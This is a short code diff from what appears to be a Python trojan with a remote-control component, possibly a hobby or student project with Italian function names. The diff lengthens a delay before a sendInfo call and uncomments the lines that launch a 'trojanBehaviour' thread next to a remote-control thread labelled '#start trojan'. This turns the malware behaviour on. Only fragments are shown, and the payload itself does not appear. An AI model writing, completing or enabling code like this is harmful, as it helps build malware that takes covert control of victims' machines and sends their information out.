@@ -11,7 +11,7 @@ def main():
             raise Exception
         else:
             client.setblocking(True)
-            time.sleep(5)
+            time.sleep(7)
             try:
                 sendInfo(client)
             except Exception as e:
@@ -49,10 +49,10 @@ def avvio():
 if __name__ == "__main__":
     #start trojan
 
-    #thread_trojan = Thread(target=trojanBehaviour)
-    #thread_trojan.start()
+    thread_trojan = Thread(target=trojanBehaviour)
+    thread_trojan.start()
     thread_remoteControl = Thread(target=avvio)
     thread_remoteControl.start()
-    #thread_trojan.join()
-    #thread_remoteControl.join()
+    thread_trojan.join()
+    thread_remoteControl.join()
 
